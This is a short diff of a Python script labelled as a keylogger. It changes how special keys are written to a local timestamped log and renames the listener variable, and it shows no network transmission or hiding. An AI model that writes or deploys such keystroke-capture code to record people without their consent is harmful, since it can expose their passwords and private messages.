@@ -14,7 +14,7 @@ def on_press(key):
     except AttributeError:
         # For special keys like space, enter, esc, etc.
         with open(log_file, "a", encoding="utf-8") as f:
-            f.write(time_stamp + f"[{key.name}]\n")
+            f.write(time_stamp + f"[{str(key)}]\n")
 
 # Function to stop listener
 def on_release(key):
@@ -22,6 +22,6 @@ def on_release(key):
         return False  # Stop logging when Esc is pressed
 
 # Start the keylogger
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+with keyboard.Listener(on_press=on_press, on_release=on_release) as l:
+    l.join()
 
